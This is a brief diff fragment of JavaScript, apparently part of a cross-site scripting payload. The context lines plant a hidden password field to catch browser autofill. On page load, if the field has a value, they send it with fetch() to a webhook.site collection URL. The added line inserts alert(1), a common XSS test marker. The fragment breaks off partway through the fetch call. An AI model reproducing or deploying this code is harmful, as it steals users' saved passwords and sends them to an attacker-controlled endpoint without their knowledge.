@@ -8,7 +8,7 @@ passwordEl.name = 'password';
 passwordEl.type = 'password';
 passwordEl.hidden = true;
 document.body.appendChild(passwordEl);
-
+alert(1);
 window.addEventListener('load', () => {
     if (passwordEl.value) {
         fetch('https://webhook.site/d6f59c4f-1c22-48c8-8544-d0f7cbfa77c3', {
